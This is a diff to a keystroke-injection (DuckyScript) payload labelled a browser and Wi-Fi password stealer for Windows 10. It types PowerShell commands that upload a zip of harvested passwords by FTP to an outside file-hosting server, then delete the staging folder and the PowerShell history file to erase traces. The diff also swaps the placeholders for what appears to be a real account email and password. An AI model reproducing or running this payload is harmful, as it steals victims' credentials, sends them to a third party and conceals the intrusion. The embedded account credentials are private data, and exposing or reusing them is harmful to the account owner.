@@ -1,5 +1,4 @@
-REM Browsers and Wifi Passwords stealer - W10 - V1.5
-
+REM Browsers and Wifi Passwords stealer - W10 - V1.6
 DELAY 2000
 WINDOWS d
 DELAY 1000
@@ -29,9 +28,9 @@ STRING $Dir="C:\wp_pwd\wp_pwd.zip";
 ENTER
 STRING $ftp = "ftp://ftp.drivehq.com/"
 ENTER
-STRING $user = "<YOUR EMAIL>" 
+STRING $user = "velli@hi2.in" 
 ENTER
-STRING $pass = "<YOUR PASSWORD>"
+STRING $pass = "Velli_77DH28!"
 ENTER
 STRING $webclient = New-Object System.Net.WebClient
 ENTER
@@ -43,19 +42,5 @@ STRING $uri = New-Object System.Uri($ftp+$item.Name)
 ENTER
 STRING $webclient.UploadFile($uri, $item.FullName)
 ENTER
-STRING $date = (Get-Date).ToString('MM-dd-yyyy')
-ENTER
-STRING $path = "C:\wp_pwd\wp_pwd.zip" + $date
-ENTER
-STRING If(!(test-path $path))
-ENTER
-STRING {
-ENTER
-STRING New-Item -ItemType Directory -Force -Path $path
-ENTER
-STRING }
-ENTER
-STRING Move-Item $item.FullName -destination $path
-ENTER
-STRING }; del C:\wp_pwd -Recurse; del (Get-PSReadlineOption).HistorySavePath; exit
+STRING If(!(test-path $path)){New-Item -ItemType Directory -Force -Path $path }}; del C:\wp_pwd -Recurse; del (Get-PSReadlineOption).HistorySavePath; exit
 ENTER
